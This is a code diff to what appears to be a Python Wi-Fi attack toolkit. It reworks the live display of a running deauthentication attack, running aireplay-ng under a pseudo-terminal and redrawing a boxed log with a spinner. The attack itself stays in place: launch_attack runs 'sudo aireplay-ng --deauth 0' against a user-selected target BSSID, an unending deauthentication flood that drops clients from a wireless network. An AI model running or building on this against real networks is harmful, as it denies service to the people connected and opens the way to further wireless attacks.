@@ -1,5 +1,6 @@
 import subprocess
 import os
+import pty
 import csv
 import time
 import shutil
@@ -261,6 +262,34 @@ def select_target(mon_interface):
             banner.warn("invalid selection, try again")
 
 
+ATTACK_LOG_LINES = 12  # how many recent aireplay-ng lines stay visible in the box
+
+
+def _render_attack_screen(tick, target, log_lines):
+    # redraw only the box (via restore_cursor) instead of re-clearing the whole
+    # screen and reprinting the big logo/links block on every new log line
+    banner.restore_cursor()
+
+    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
+
+    lines = [
+        f"target essid : {target['ESSID']}",
+        f"target bssid : {target['BSSID']}",
+        f"channel      : {target['channel'].strip()}",
+        "",
+        f"{spin}  sending deauth frames...",
+        "",
+    ]
+    if log_lines:
+        lines.extend(log_lines)
+    else:
+        lines.append(f"{banner.C.MUTED}waiting for aireplay-ng output...{banner.C.RESET}")
+    lines.append("")
+    lines.append(f"{banner.C.MUTED}press ctrl+c to stop{banner.C.RESET}")
+
+    banner.box(lines, title="aireplay-ng log", accent=banner.C.CYAN)
+
+
 def launch_attack(mon_interface, target):
     banner.module_banner("wifi")
     banner.section("launching deauthentication attack", accent=banner.C.CYAN)
@@ -279,35 +308,50 @@ def launch_attack(mon_interface, target):
 
     banner.module_banner("wifi")
     banner.section("deauthentication attack running", accent=banner.C.CYAN)
-    print(f"  target essid  : {target['ESSID']}")
-    print(f"  target bssid  : {bssid}")
-    print(f"  channel       : {channel}")
-    print()
-    banner.info("sending deauth frames... (press ctrl+c to stop)")
-    print()
+    banner.save_cursor()
 
+    # give aireplay-ng a real pty instead of a plain pipe for its output —
+    # a plain pipe makes it detect a non-terminal and switch to full block
+    # buffering, which delays the boxed live log by several seconds; a pty
+    # keeps it thinking it's talking to a terminal, so it stays line-buffered
+    master_fd, slave_fd = pty.openpty()
     attack_proc = subprocess.Popen(
         ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True,
-        bufsize=1,
+        stdout=slave_fd,
+        stderr=slave_fd,
+        close_fds=True,
     )
+    os.close(slave_fd)
 
-    # let the log lines print and scroll naturally instead of redrawing a
-    # bordered box on every line — that constant clear-and-reprint of the
-    # whole box is what made the live log feel choppy
+    log_lines = []
+    tick = 0
+    buf = ""
     try:
-        for line in attack_proc.stdout:
-            line = line.rstrip("\n").strip()
-            if line:
-                print(f"  {banner.C.MUTED}{line}{banner.C.RESET}")
+        while True:
+            try:
+                chunk = os.read(master_fd, 4096)
+            except OSError:
+                break  # the slave side closed once aireplay-ng exited
+            if not chunk:
+                break
+
+            buf += chunk.decode("utf-8", errors="replace")
+            *complete_lines, buf = buf.replace("\r\n", "\n").replace("\r", "\n").split("\n")
+            for line in complete_lines:
+                line = line.strip()
+                if line:
+                    log_lines.append(line)
+                    del log_lines[:-ATTACK_LOG_LINES]
+
+            _render_attack_screen(tick, target, log_lines)
+            tick += 1
     except KeyboardInterrupt:
         pass
     finally:
         if attack_proc.poll() is None:
             attack_proc.terminate()
         attack_proc.wait()
+        os.close(master_fd)
 
     banner.warn("deauthentication attack stopped")
 
